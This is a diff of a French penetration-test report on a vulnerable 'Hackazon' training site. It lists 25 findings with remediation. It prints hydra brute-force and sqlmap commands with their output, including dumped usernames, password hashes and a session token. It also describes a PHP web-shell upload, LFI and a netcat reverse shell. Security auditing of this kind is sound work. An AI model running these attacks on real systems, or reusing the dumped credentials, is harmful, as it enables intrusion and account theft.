@@ -1,22 +1,30 @@
 # RAPPORT D’ÉVALUATION DE SÉCURITÉ – SITE WEB HACKATHON
 
+
+**Confidentiel – Diffusion restreinte**
+**Version :** 1.2 (technique enrichie)
+**Date :** 19/10/2025
+
+---
+
 ## 1. PRÉAMBULE
 
 ### 1.1 PRÉSENTATION DES RÉSULTATS
 
-Ce rapport présente les résultats de l’évaluation de la sécurité du site web Hackathon. Il inclut une synthèse managériale, une synthèse technique, les vulnérabilités identifiées, les risques associés, ainsi que les recommandations de remédiation.
+Ce rapport présente les résultats de l’évaluation de la sécurité du site web *Hackathon*. Il contient : synthèse managériale, synthèse technique, PoC bruts (commandes / sorties), vulnérabilités identifiées, risques associés, recommandations et plan de remédiation priorisé.
 
 ### 1.2 CONTEXTE
 
-**FIXME : RAPPEL DU CONTEXTE :**  
-Cette mission a été conduite dans le cadre de l'amélioration continue de la sécurité du site Hackathon. Elle vise à identifier les vulnérabilités potentielles via un test d’intrusion externe et une revue applicative, afin de renforcer la posture de sécurité globale.
+Mission réalisée dans le cadre d’un test d’intrusion externe + revue applicative (blackbox + greybox).
+**Périmètre :** domaine principal + API.
+**Période :** 10 → 19/10/2025.
 
 ### 1.3 PILOTAGE DE LA PRESTATION
 
-- **Client :** Mr Robin
-- **Équipe d’audit :** Ryan Rais Mehdi Lacher
-- **Période de l’audit :** 10-19/10/2025
-- **Méthodologie :** Basée sur l’OWASP Testing Guide v4, les recommandations de l’ANSSI, et les benchmarks CIS applicables.
+* **Client :** Mr Robin
+* **Équipe :** Ryan Rais, Mehdi Lacher
+* **Méthodologie :** OWASP Testing Guide v4, ANSSI, CIS Benchmarks.
+* **Outils :** Nmap, dirsearch, Burp Suite, OWASP ZAP, sqlmap, hydra, ffuf, curl, jq.
 
 ### 1.4 ACTIONS DE NETTOYAGE RECOMMANDÉES
 
@@ -34,13 +42,46 @@ Cette mission a été conduite dans le cadre de l'amélioration continue de la s
 
 L’analyse du site Hackathon a permis de mettre en évidence plusieurs vulnérabilités de gravité variable. Bien que la majorité des mécanismes de sécurité soient correctement implémentés, certaines faiblesses peuvent être exploitées dans un contexte d’attaque ciblée.
 
+* **État général :** plusieurs failles **critiques** (SQLi, IDOR, Upload exécutable → RCE, XSS) combinées permettent une compromission complète.
+* **Actions immédiates recommandées :**
+
+  * Bloquer ou restreindre Swagger.
+  * Désactiver l’upload exécutable.
+  * Appliquer un WAF (SQLi / XSS).
+  * Corriger les IDOR.
+* **Re-test :** sous 2 à 4 semaines après correctifs critiques.
+
 ### 2.2 SYNTHÈSE DES RISQUES
 
-| Risque identifié | Niveau de risque | Impact potentiel |
-|------------------|------------------|------------------|
-| Injection SQL    | Critique         | Accès aux données |
-| Fuite d'informations via headers HTTP | Moyen | Collecte d'informations techniques |
-| Manque de politique CSP | Faible | Exploitation possible via XSS |
+| #  | Intitulé                                                                                                              | Exploitation | Impact    | Criticité |
+|----|-----------------------------------------------------------------------------------------------------------------------|--------------|-----------|-----------|
+| 1  | Exposition publique du fichier `swagger.json` (cartographie complète des API)                                        | Haut         | Élevé     | CRITIQUE  |
+| 2  | Absence d’en‑têtes de sécurité HTTP (HSTS, CSP, X-Frame-Options, X-Content-Type-Options, etc.)                        | Moyen        | Élevé     | ÉLEVÉ     |
+| 3  | Divulgation d’informations techniques via `Server` / `X-Powered-By` (Nginx, PHP 5.6.40)                                | Moyen        | Moyen     | MOYEN     |
+| 4  | Absence de validation d’email à l’inscription (pas de confirmation)                                                   | Haut         | Moyen     | ÉLEVÉ     |
+| 5  | Impossible de modifier le mot de passe depuis le profil utilisateur                                                   | Moyen        | Élevé     | ÉLEVÉ     |
+| 6  | Acceptation de mots de passe faibles (pas de politique / blacklist)                                                    | Haut         | Élevé     | CRITIQUE  |
+| 7  | Bruteforce possible (pas de protection anti‑brute force / rate limiting) — Hydra a réussi                             | Élevé        | Élevé     | CRITIQUE  |
+| 8  | Acceptation non documentée de méthodes HTTP sur `/api/user/{user_id}` (GET/DELETE/POST alors que seul PUT documenté)  | Moyen        | Élevé     | ÉLEVÉ     |
+| 9  | IDOR sur `/api/user/{id}` : modification de tous les comptes via PUT (absence d’object-level auth)                     | Élevé        | Critique  | CRITIQUE  |
+| 10 | IDOR sur `/api/order`, `/api/cart`, `/api/customerAddress` : lecture/écriture des données d'autres utilisateurs       | Élevé        | Élevé     | CRITIQUE  |
+| 11 | Possibilité de modifier le champ `active` pour désactiver tous les comptes                                            | Élevé        | Élevé     | CRITIQUE  |
+| 12 | XSS stockée sur page FAQ — vol de session (PHPSESSID accessible) → usurpation de comptes (ex : jdoe)                   | Élevé        | Critique  | CRITIQUE  |
+| 13 | Cookies de session non sécurisés (pas HttpOnly, pas Secure, pas SameSite attentionnée)                                | Moyen        | Élevé     | ÉLEVÉ     |
+| 14 | Injection de commandes via paramètre de chemin (inclusion/exécution par concaténation / shell)                        | Élevé        | Critique  | CRITIQUE  |
+| 15 | SQL Injection sur `/product/view?id=` (exfiltration tbl_users, hashes de mots de passe)                                | Élevé        | Critique  | CRITIQUE  |
+| 16 | LFI via `account/help_articles?page=` (lecture de `/etc/passwd` avec `%00` null byte)                                  | Élevé        | Critique  | CRITIQUE  |
+| 17 | Téléversement non sécurisé (upload d’un shell PHP dans `/user_pictures/`) — exécution → RCE & reverse shell possible  | Élevé        | Critique  | CRITIQUE  |
+| 18 | Exfiltration via reverse shell / archive des fichiers accessibles depuis webroot                                      | Élevé        | Critique  | CRITIQUE  |
+| 19 | Fichiers de configuration contenant credentials exposés (ex : config/db credentials accessibles)                       | Élevé        | Critique  | CRITIQUE  |
+| 20 | Affichage d’erreurs PHP/JS en production (stack traces, chemins absolus)                                               | Faible       | Moyen     | MOYEN     |
+| 21 | Redirection ouverte (`return_url`) facilitant phishing / redirection vers sites malveillants                            | Moyen        | Moyen     | MOYEN     |
+| 22 | Directory listing / services non nécessaires exposés (ex: port 9002 / index listing)                                   | Faible       | Moyen     | MOYEN     |
+| 23 | Manque de RBAC formel / découverte aisée du panneau admin (`/admin`)                                                    | Moyen        | Élevé     | ÉLEVÉ     |
+| 24 | Absence de filtrage / sanitisation dans `contactMessages` (XSS stocké et données personnelles visibles)                 | Moyen        | Élevé     | ÉLEVÉ     |
+| 25 | Usage de versions obsolètes / non maintenues (ex : PHP 5.6.40 détecté)                                                  | Moyen        | Élevé     | ÉLEVÉ     |
+
+
 
 ### 2.3 SYNTHÈSE DES VULNÉRABILITÉS ET RECOMMANDATIONS
 
@@ -128,6 +169,10 @@ Nmap done: 1 IP address (1 host up) scanned in 19.08 seconds
 
 cet outil nous permet de voir les fichiers,routes disponibles sur le site web
 
+| Intitulé                                                | Exploitation | Impact  | Criticité |
+|---------------------------------------------------------|--------------|---------|-----------|
+| Exposition publique du fichier Swagger contenant l’API  | Haut         | Élevé   | CRITIQUE  |
+
 ```bash
 dirsearch -u https://hackazon.trackflaw.com/
 /usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
@@ -188,7 +233,6 @@ Target: https://hackazon.trackflaw.com/
 ```
 
 Il y a parmis ces fichiers un fichier nommé 'swagger.json'. Ce fichier , exposé publiquement, a permis de cartographier l’intégralité des endpoints disponibles dans l’API, y compris ceux normalement réservés à des opérations sensibles comme 
-
 
 - Authentification
 - **GET** `/api/auth` — Authentification via HTTP Basic Auth (retourne un token de session)
@@ -261,7 +305,17 @@ Le Swagger peut être importé dans des outils comme Postman, Burp Suite, ZAP, I
 4 - Absence de cloisonnement entre environnements :
 Si le même Swagger est déployé sur les environnements de test et de production, il peut révéler des endpoints internes ou non encore sécurisés.
 
+🔧 **Recommandation :**
+- Garder ce fichier coté backend ne surtout pas le mettre en publique
+
 ##### 2. Configuration et mécanismes de déploiement
+
+
+| Intitulé                                                                                     | Exploitation | Impact | Criticité |
+|----------------------------------------------------------------------------------------------|--------------|--------|-----------|
+| Absence d’en-têtes de sécurité HTTP (HSTS, CSP, XFO, etc.)                                  | Moyen        | Élevé  | ÉLEVÉ     |
+| Divulgation d’informations techniques via les en-têtes `Server` et `X-Powered-By`            | Moyen        | Moyen  | MOYEN     |
+
 
 ```bash
 curl -I https://hackazon.trackflaw.com
@@ -284,7 +338,8 @@ pragma: no-cache
 Ces en-têtes exposent notamment le type de serveur web (**Nginx**) ainsi que la version du moteur PHP (**5.6.40**).  
 Ces informations, bien que non sensibles à elles seules, peuvent être exploitées par un attaquant pour **identifier des vulnérabilités connues** associées à ces versions ou cibler des exploits spécifiques, facilitant ainsi des attaques ultérieures.
 
-
+🔧 **Recommandation :**
+Configurer le serveur web pour ajouter les en-têtes de sécurité HTTP manquants (HSTS, CSP, XFO, etc.) et masquer les informations techniques (Server, X-Powered-By) en désactivant server_tokens et expose_php.
 
 ##### 3. Gestion des identités
 
@@ -299,6 +354,10 @@ Ces informations, bien que non sensibles à elles seules, peuvent être exploit�
 
 
 ###### 3.2 Absence de confirmation lors de la création de compte
+
+| Intitulé                                                              | Exploitation | Impact | Criticité |
+|-----------------------------------------------------------------------|--------------|--------|-----------|
+| Absence de validation d’email lors de l’inscription                  | Haut         | Moyen  | ÉLEVÉ     |
 
 **🔹 Vulnérabilité : Absence de validation d’email à l’inscription**
 
@@ -318,6 +377,11 @@ Ces informations, bien que non sensibles à elles seules, peuvent être exploit�
 
 **4.1 Absence de possibilité de modifier le mot de passe**
 
+| Intitulé                                                       | Exploitation | Impact | Criticité |
+|----------------------------------------------------------------|--------------|--------|-----------|
+| Absence de fonctionnalité pour modifier le mot de passe        | Moyen        | Élevé  | ÉLEVÉ     |
+
+
 - Depuis le lien : `/account/profile/edit`, l'utilisateur peut modifier :
   - Son prénom, nom, téléphone
   - ❌ **Mais pas son mot de passe ni son email**
@@ -328,6 +392,9 @@ Ces informations, bien que non sensibles à elles seules, peuvent être exploit�
 
 ---
 
+| Intitulé                                                       | Exploitation | Impact | Criticité |
+|----------------------------------------------------------------|--------------|--------|-----------|
+| Acceptation de mots de passe faibles sans contrôle de complexité | Haut         | Élevé  | CRITIQUE  |
 
 
 **🔹 Vulnérabilité : Mots de passe faibles acceptés sans restriction**
@@ -423,6 +490,11 @@ curl -v -u zindar:a \
 on a maintenant un token qui nous sera très utile pour la suite "313e860e4d45d91f8261661db4d520bd46b8b00b"
 grace au routes trouvée dans le swagger on peut acceder a nos information :
 
+| Intitulé                                                        | Exploitation | Impact  | Criticité |
+|-----------------------------------------------------------------|--------------|---------|-----------|
+| Brute‑force réussi contre la page de connexion (hydra + rockyou) | Élevé        | Élevé   | CRITIQUE  |
+
+
 On peut également bruteforce les mdp avec hydra ce qui prouve qu'il n'y a pas de protection antibruteforce
 ```bash
 hydra -S -l test_user -P /usr/share/wordlists/rockyou.txt hackazon.trackflaw.com https-post-form \
@@ -438,6 +510,8 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-18 04:10:
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-18 04:11:00
 
 ```
+🔧 **Recommandation :**
+Mettre en place une protection anti‑bruteforce sur la page de connexion en limitant le nombre de tentatives (rate limiting, délai progressif ou CAPTCHA) et en journalisant les échecs d’authentification pour détecter les attaques répétées.
 
 ---
 
@@ -451,6 +525,11 @@ curl -H "Authorization: Token 313e860e4d45d91f8261661db4d520bd46b8b00b" \
 ##### 5 Autorisation
 
 ###### 5.1 IDOR 
+
+| Intitulé                                                                                         | Exploitation | Impact  | Criticité |
+|--------------------------------------------------------------------------------------------------|--------------|---------|-----------|
+| Acceptation non documentée de méthodes HTTP sur l’endpoint `/api/user/{user_id}`                | Moyen        | Élevé   | ÉLEVÉ     |
+
 
 sur la route api/user/{id} on est censé seulement pouvoir faire des PUT :
 
@@ -503,6 +582,13 @@ curl -X GET \
 ```
 
 ---
+
+
+| Intitulé                                                                                                  | Exploitation | Impact   | Criticité |
+|-----------------------------------------------------------------------------------------------------------|--------------|----------|-----------|
+| IDOR sur `/api/user/{user_id}`,`/api/order/{order_id}`, `/api/cart/{cart_id}`, etc. exposant les données d'autres utilisateurs | Élevé        | Élevé    | CRITIQUE  |
+| Absence de contrôle sur le champ `active` dans l’API, permettant de désactiver tous les comptes           | Élevé        | Élevé    | CRITIQUE  |
+| Réponse JSON contenant des données sensibles dans `/api/contactMessages` (XSS injecté + e-mails visibles) | Moyen        | Élevé    | ÉLEVÉ     |
 
 Il est possible de modifier les informations de tous les utilisateurs du système en envoyant une requête PUT authentifiée vers l’endpoint /api/user/{user_id}, sans restriction de droits, et sans vérification que l’utilisateur modifiant les données est bien propriétaire du compte.
 
@@ -616,7 +702,18 @@ Conséquences :
 - Perturbation massive : tous les comptes peuvent être désactivés ("active": "0"), rendant le service inutilisable.
 - Exfiltration ou destruction de données personnelles sensibles.
 
+
+**🛠️ Recommandations**
+Mettre en œuvre un contrôle d'accès strict côté serveur pour vérifier que l'utilisateur authentifié est autorisé à accéder ou modifier uniquement ses propres ressources, en validant systématiquement son identité via des vérifications d’ownership (user ID/token).
+
 ###### 5.2 Compromision du compte Jdoe
+
+
+
+| Intitulé                                                                 | Exploitation | Impact   | Criticité |
+|--------------------------------------------------------------------------|--------------|----------|-----------|
+| XSS stockée sur la page FAQ permettant le vol du cookie PHPSESSID et l’usurpation de session | Élevé        | Critique | CRITIQUE  |
+
 
 Une vulnérabilité de type **XSS (Cross-Site Scripting)** a été identifiée sur la page FAQ.  
 Celle-ci permet à un attaquant d’injecter et d’exécuter du code JavaScript malveillant dans le navigateur d’un utilisateur authentifié.  
@@ -672,10 +769,14 @@ Usurpation de session :
 
 
 
-
 ##### 6 Gestion des sessions
 
-###### 6.1 Cookies non sécurisé ( a refaire MEHDI)
+###### 6.1 Cookies non sécurisé 
+
+| Intitulé                                       | Exploitation | Impact   | Criticité |
+|------------------------------------------------|--------------|----------|-----------|
+| Absence des attributs Secure, HttpOnly et Domain sur le cookie de session PHPSESSID | Élevé        | Élevé | CRITIQUE  |
+
 
 Après avoir analysé le cookie de session PHP, nous avons remarqué que les
 attributs de sécurité “Secure”, “HTTP-Only” et “Domain” sont manquants.
@@ -684,6 +785,7 @@ n'est donc jamais envoyé en clair.
 “HTTP-Only” protège contre le vol de cookie lors d’une attaque de type XSS.
 “Domain” vérifie si le domaine du site est bien celui inscrit dans le cookie afin
 d’éviter sa récupération par un tiers malveillant.
+
 Remédiation : Mettre en place les attributs de sécurité ci-dessus au cookie
 PHPSESSID. De plus, il faudrait générer un nouveau cookie après s’être
 authentifié et le supprimer après la déconnexion
@@ -691,6 +793,11 @@ authentifié et le supprimer après la déconnexion
 ##### 7 Validations des entrées utilisateurs
 
 ###### 7.1 Injection de commandes 
+
+| Intitulé                                       | Exploitation | Impact   | Criticité |
+|------------------------------------------------|--------------|----------|-----------|
+| Injection de commandes via le paramètre de chemin (ex. `terms.html` remplacé) | Élevé        | Critique | CRITIQUE  |
+
 sur la page :
 
 ![alt text](src/image-2.png)
@@ -700,24 +807,42 @@ si on remplace ce dernier par une commande avec un point virgule au début
 ![alt text](src/image-4.png)
 on peut injecter des commandes 
 
+**🛠️ Recommandations**
+
+- ✅ Ne jamais exécuter directement des entrées utilisateur dans une commande système (ex: `system()`, `exec()`, `shell_exec()`).
+- ✅ Utiliser des fonctions sécurisées avec échappement automatique (ex: `escapeshellarg()` ou `proc_open()` avec contrôle strict).
+- ✅ Implémenter une **liste blanche** de fichiers accessibles (ex: `terms.html`, `about.html`) sans concaténation directe.
+- ✅ Vérifier systématiquement que les valeurs passées dans l’URL ne contiennent aucun caractère spécial (`;`, `&`, `|`, etc.).
+- ✅ Utiliser des ID internes ou des alias (ex: `?page=terms` → serveur mappe en interne vers un fichier statique).
+- ✅ Séparer clairement les fichiers statiques consultables des scripts exécutables dans l'arborescence du serveur.
+- 🔐 Restreindre les permissions du serveur web (ex: `www-data`) pour limiter les dégâts d’une éventuelle exécution.
+- 🧪 Mettre en place des tests de fuzzing et de validation côté serveur pour détecter les vecteurs d'injection.
+
+
 
 ###### 7.2 SQL Injection
+
+| Intitulé                                                                 | Exploitation | Impact   | Criticité |
+|--------------------------------------------------------------------------|--------------|----------|-----------|
+| Injection SQL sur le paramètre `id` de `/product/view` permettant l’exfiltration de données sensibles | Élevé        | Critique | CRITIQUE  |
+
+
 ```bash
-sqlmap -u "https://hackazon.trackflaw.com/product/view?id=64%67" -D hackazon -T tbl_users -C username,password --dump
+sqlmap -u "https://hackazon.trackflaw.com/product/view?id=1%400" -D hackazon -T tbl_users -C username,password --dump
         ___
        __H__
- ___ ___[(]_____ ___ ___  {1.9.6#stable}                                                                                                                                                     
-|_ -| . [,]     | .'| . |                                                                                                                                                                    
-|___|_  [.]_|_|_|__,|  _|                                                                                                                                                                    
+ ___ ___[']_____ ___ ___  {1.9.6#stable}                                                                                                                                                     
+|_ -| . [(]     | .'| . |                                                                                                                                                                    
+|___|_  [']_|_|_|__,|  _|                                                                                                                                                                    
       |_|V...       |_|   https://sqlmap.org                                                                                                                                                 
 
 [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
 
-[*] starting @ 02:32:06 /2025-10-18/
+[*] starting @ 20:13:45 /2025-10-19/
 
-[02:32:06] [INFO] resuming back-end DBMS 'mysql' 
-[02:32:06] [INFO] testing connection to the target URL
-you have not declared cookie(s), while server wants to set its own ('PHPSESSID=51106b0ce62...52e47fea95;visited_products=%2C64g%2C'). Do you want to use those [Y/n] y
+[20:13:45] [INFO] resuming back-end DBMS 'mysql' 
+[20:13:45] [INFO] testing connection to the target URL
+you have not declared cookie(s), while server wants to set its own ('PHPSESSID=690bbb35d2d...289c0652ba;visited_products=%2C1%400%2C'). Do you want to use those [Y/n] y
 sqlmap resumed the following injection point(s) from stored session:
 ---
 Parameter: id (GET)
@@ -737,21 +862,22 @@ Parameter: id (GET)
     Title: Generic UNION query (NULL) - 27 columns
     Payload: id=-2883' UNION ALL SELECT CONCAT(0x716a716a71,0x6f426e47414b48644756716c794462786f504a78464f624e524a5062586b4f614d426c4144434652,0x717a707171),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
 ---
-[02:32:21] [INFO] the back-end DBMS is MySQL
+[20:13:49] [INFO] the back-end DBMS is MySQL
 web application technology: Nginx, PHP 5.6.40, PHP
 back-end DBMS: MySQL >= 5.0.12
-[02:32:21] [INFO] fetching entries of column(s) 'password,username' for table 'tbl_users' in database 'hackazon'
-[02:32:22] [WARNING] reflective value(s) found and filtering out
-[02:32:23] [INFO] retrieved: '7d4a69db92c867d9b0060653c44733bf:108853d9fae39d4bb','test_user'
-[02:32:24] [INFO] retrieved: 'dbcc4ed6943bf62bb67170742cf1aefa:146859157968e8b5062bf10','admin'
-[02:32:24] [INFO] retrieved: '4d1734dc3097b5c1683d70d39e4df7fa:46844494268e8b51f6f42f','jdoe'
-[02:32:24] [INFO] retrieved: '766d4b0b1e8647a9cff98506bc4fa1bf:59652974868e8b53b41df9','guest'
-[02:32:25] [INFO] retrieved: '0825175d340512aa53c657be2dd1cb46:164227316068e8b53e7ee62','D0R3TDEPLATINEE'
-[02:32:25] [INFO] retrieved: '3ad16bac3b75e20a984a4b671a6d4c8a:60999490468e8b54fc7f21','BENPI'
-[02:32:26] [INFO] retrieved: 'dbbfdb295b80f0bc8178779d421899ce:59576059068e8b5739f741','a.landais'
+[20:13:49] [INFO] fetching entries of column(s) 'password,username' for table 'tbl_users' in database 'hackazon'
+[20:13:52] [WARNING] reflective value(s) found and filtering out
+[20:13:52] [INFO] retrieved: '0a3d0c780b6df84f37e0b59cca77dfd3:142035250768e8b5c8c3e02','WhiteColors_'
+[20:13:54] [INFO] retrieved: '5fead1f61e27d509cb9239aad141f2bf:6563806968e8b5d82320e','letgo'
+[20:13:55] [INFO] retrieved: '1ad813738f0b099f5413d510ea769906:42257496968e8b5f04058e','w'
+[20:13:57] [INFO] retrieved: 'e8d396b1eb9a95ace2facbaa2cf6eedd:159695652468e8b67a7783c','momotest'
+[20:13:59] [INFO] retrieved: '04914d55c6af1e3718976c36ada87e54:68427529368e8b686a7ea2','nerkos'
+[20:14:00] [INFO] retrieved: 'c15dc794fef1040e16490af8871e3e74:179192733168e8bcde2a09c','test'
+[20:14:02] [INFO] retrieved: 'ef8d2ba8c927e6652c08af98bc1e2c96:77604256468e8bda823af1','zindar'
+[20:14:04] [INFO] retrieved: 'abaa03938301955f256d673c98707ec3:85486099168e8c0713ce7e','test01'
 Database: hackazon                                                                                                                                                                          
 Table: tbl_users
-[7 entries]
+[15 entries]
 +-----------------+----------------------------------------------------------+
 | username        | password                                                 |
 +-----------------+----------------------------------------------------------+
@@ -762,24 +888,48 @@ Table: tbl_users
 | D0R3TDEPLATINEE | 0825175d340512aa53c657be2dd1cb46:164227316068e8b53e7ee62 |
 | BENPI           | 3ad16bac3b75e20a984a4b671a6d4c8a:60999490468e8b54fc7f21  |
 | a.landais       | dbbfdb295b80f0bc8178779d421899ce:59576059068e8b5739f741  |
+| WhiteColors_    | 0a3d0c780b6df84f37e0b59cca77dfd3:142035250768e8b5c8c3e02 |
+| letgo           | 5fead1f61e27d509cb9239aad141f2bf:6563806968e8b5d82320e   |
+| w               | 1ad813738f0b099f5413d510ea769906:42257496968e8b5f04058e  |
+| momotest        | e8d396b1eb9a95ace2facbaa2cf6eedd:159695652468e8b67a7783c |
+| nerkos          | 04914d55c6af1e3718976c36ada87e54:68427529368e8b686a7ea2  |
+| test            | c15dc794fef1040e16490af8871e3e74:179192733168e8bcde2a09c |
+| zindar          | ef8d2ba8c927e6652c08af98bc1e2c96:77604256468e8bda823af1  |
+| test01          | abaa03938301955f256d673c98707ec3:85486099168e8c0713ce7e  |
 +-----------------+----------------------------------------------------------+
 
-[02:32:32] [INFO] table 'hackazon.tbl_users' dumped to CSV file '/root/.local/share/sqlmap/output/hackazon.trackflaw.com/dump/hackazon/tbl_users.csv'
-[02:32:32] [WARNING] HTTP error codes detected during run:
-503 (Service Unavailable) - 1 times, 502 (Bad Gateway) - 34 times
-[02:32:32] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/hackazon.trackflaw.com'
+[20:14:40] [INFO] table 'hackazon.tbl_users' dumped to CSV file '/root/.local/share/sqlmap/output/hackazon.trackflaw.com/dump/hackazon/tbl_users.csv'
+[20:14:40] [WARNING] HTTP error codes detected during run:
+503 (Service Unavailable) - 1 times, 502 (Bad Gateway) - 26 times
+[20:14:40] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/hackazon.trackflaw.com'
 
-[*] ending @ 02:32:32 /2025-10-18/
-
+[*] ending @ 20:14:40 /2025-10-19/
 
 ```
 ici la vulérabilité est critique car un user qui n'est meme pas connecté peut avoir le hash des users critiques comme l'admin et listez tout les users
 
-on peut craquer le hash admin .
+on peut également craquer le hash admin .
+
+**Remediation**
+
+- ✅ Utiliser des requêtes **paramétrées** (prepared statements) avec des bibliothèques sécurisées comme PDO (PHP), `mysqli`, SQLAlchemy (Python), etc.
+- ✅ Ne **jamais concaténer directement** des entrées utilisateur dans une requête SQL.
+- ✅ Valider et filtrer les données côté serveur : s'assurer que les types attendus sont strictement respectés (`int`, `email`, etc.).
+- ✅ Restreindre les droits SQL : l'utilisateur base de données utilisé par l'application ne doit jamais avoir de droits `DROP`, `DELETE *`, etc.
+- ✅ Activer le **logging des erreurs SQL** côté serveur (sans les afficher à l'utilisateur).
+- ✅ Mettre en place un **WAF** ou des règles de détection pour intercepter les requêtes malformées (mod_security, etc.).
+- 🧪 Effectuer des tests automatisés avec **sqlmap**, ZAP ou Burp Suite pour identifier et corriger les points d’injection.
+
+
 
 
 
 ###### 7.3 LFI
+
+| Intitulé                                                                                  | Exploitation | Impact   | Criticité |
+|-------------------------------------------------------------------------------------------|--------------|----------|-----------|
+| Inclusion de fichiers locaux via le paramètre `page` (LFI) menant à la lecture de `/etc/passwd` | Élevé        | Critique | CRITIQUE  |
+
 
 ![alt text](src/image-3.png)
 
@@ -803,7 +953,16 @@ On met le caractère `%00` (null byte) pour faire une **troncation d'extension**
 
 
 
-###### 7.4 Reverse SHell
+###### 7.4 Reverse Shell
+
+| Intitulé                                                                                   | Exploitation | Impact   | Criticité |
+|--------------------------------------------------------------------------------------------|--------------|----------|-----------|
+| Téléversement non sécurisé de fichiers permettant l’upload d’un script malveillant (RCE)  | Élevé        | Critique | CRITIQUE  |
+| Exécution d’un reverse shell via script uploadé + redirection vers l’IP attaquante        | Élevé        | Critique | CRITIQUE  |
+| Configuration serveur permissive (exécution PHP dans répertoire upload)                   | Moyen        | Élevé    | ÉLEVÉ     |
+| Exposition de fichiers sensibles depuis le reverse shell (exfiltration via HTTP direct)   | Élevé        | Critique | CRITIQUE  |
+| Présence du fichier.apk android de l'application dans le dossier web du site                 | Élevé        | Critique | CRITIQUE  |
+| Accès aux identifiants de la base de données dans un fichier de configuration (ex: `config.php`) | Élevé        | Critique | CRITIQUE  |
 
 Après avoir fait deux règle sur mon firewall orange pour ouvrir un port ssh et un autre port de connexion si on va sur nore script upload précédement avec l'pload de fichier on peut lui dire de pointer vers notre ip publique et on a donc un revrse shell intégré
 
@@ -815,17 +974,42 @@ On a donc libre accès aux fichier du site web on va prendre les plus importants
 ![alt text](image-2.png)
 ![alt text](image-4.png)
 ![alt text](image-5.png)
-on a également accès au credentials de la DB :
+On a accès a toutes les tables leurs créations contenus dans le fichier.db précédemment exfiltré.
+![alt text](image-6.png)
+
+on a également accès au credentials de la DB , et à l'APK de l'application :
 
 ![alt text](image-1.png)
 
+**Remédiations**
 
+- Valider strictement les fichiers côté serveur (extension + signature).
+- Utiliser une whitelist d’extensions autorisées.
+- Vérifier la taille maximale des uploads.
+- Renommer les fichiers uploadés avec un identifiant aléatoire.
+- Stocker les uploads hors du webroot.
+- Servir les fichiers via un contrôleur authentifié, pas par inclusion directe.
+- Interdire l’exécution de tout fichier présent dans le dossier d’uploads.
+- Supprimer/neutraliser les bits exécutable sur les fichiers uploadés.
+- Scanner automatiquement les uploads avec un moteur antivirus/sandbox.
+- Éviter toute inclusion basée sur un paramètre utilisateur (mapper des clés à des fichiers).
+- Normaliser et résoudre les chemins puis vérifier qu’ils restent dans le répertoire autorisé.
+- Bloquer les motifs dangereux (../, %00, séquences encodées).
+- Désactiver les fonctions d’exécution système inutiles dans la config applicative.
+- Restreindre l’accès aux fichiers de configuration et secrets hors du dépôt public.
+- Stocker les credentials dans un gestionnaire de secrets, pas dans des fichiers web.
+- Appliquer le principe du moindre privilège aux comptes et processus web.
+- Ajouter des tests CI qui tentent des LFI/RCE classiques et valident les protections.
+- Intégrer SAST/DAST dans le pipeline pour détecter régressions.
+- Logger et alerter les tentatives d’accès anormales aux fichiers.
+- Mettre en place une revue de code obligatoire pour tout changement touchant l’upload ou l’inclusion de fichiers.
 
 ###### 7.5 XSS
+| Intitulé                                                                 | Exploitation | Impact   | Criticité |
+|--------------------------------------------------------------------------|--------------|----------|-----------|
+| XSS stockée sur la page FAQ permettant le vol du cookie PHPSESSID et l’usurpation de session | Élevé        | Critique | CRITIQUE  |
 
-Après avoir fait deux règle sur mon firewall orange pour ouvrir un port ssh et un autre port de connexion si on va sur nore script upload précédement avec l'pload de fichier on peut lui dire de pointer vers notre ip publique et on a donc un revrse shell intégré
-
-![alt text](image.png)
+Voir la partie compromition du compte J.doe pour plus de détails.
 
 
 ##### 8. Gestion des erreurs
@@ -833,21 +1017,28 @@ Après avoir fait deux règle sur mon firewall orange pour ouvrir un port ssh et
 
 ###### 8.1 Erreur 
 
+| Intitulé                                                                  | Exploitation | Impact | Criticité |
+|---------------------------------------------------------------------------|--------------|--------|-----------|
+| Affichage d’erreurs PHP et JavaScript contenant des chemins de fichiers  | Faible       | Moyen  | MOYEN     |
+
 On peut trouver des erreurs PHP et jquery qui nous donnent la version et meme le path de certains fichiers PHP 
 
 Cependnat il n'y a pas d'erreur SQL 
 
-
-
-
-
 ##### 9. Cryptographie
 
-- Pas de cryptographie les mdp sont bien hashé nativement par Mysql hormis ceci .
+- Pas de cryptographie les mots de passes sont bien hashé nativement par Mysql hormis ceci .
 
 ##### 10. Processus métier
 
 ###### 10.1 Depot de fichier
+
+
+| Intitulé                                                                                     | Exploitation | Impact   | Criticité |
+|----------------------------------------------------------------------------------------------|--------------|----------|-----------|
+| Téléversement non sécurisé dans la page profil permettant l’exécution de code PHP (RCE)     | Élevé        | Critique | CRITIQUE  |
+
+
 En allant sur la page profile pour éditer on a la possibilité d'upload une image 
 
 ![alt text](src/image-5.png)
@@ -882,14 +1073,42 @@ On peut par la suite via notre shell y mettre des commandes :
 
 on peut meme y mettre un reverse shell grace a netcat pour avoir un accès complet avec l'user **www-data**
 
+🛠️ Recommandations de remédiation immédiate :
+  Mesure	Détail
+  Filtrage des types MIME	Vérifier le type réel avec finfo_file() ou file (ne pas se fier au champ Content-Type).
+  Vérification d’extension	N’autoriser que .jpg, .jpeg, .png, .gif.
+  Renommage des fichiers uploadés	Générer un nom aléatoire avec extension contrôlée (ex: .jpg) même si ce n’est pas une image.
+  Conversion forcée en image	Utiliser ImageMagick ou GD pour retransformer le fichier (ex: réécriture en JPEG).
+  Interdiction d’exécution dans /user_pictures/
+
 ###### 10.2 Redirection Libre
 
+| Intitulé                                                            | Exploitation | Impact | Criticité |
+|---------------------------------------------------------------------|--------------|--------|-----------|
+| Redirection libre via le paramètre `return_url` lors de la connexion | Moyen        | Moyen  | MOYEN     |
 
 ![alt text](src/image-8.png)
 
 dés qu'on se connecte : 
 
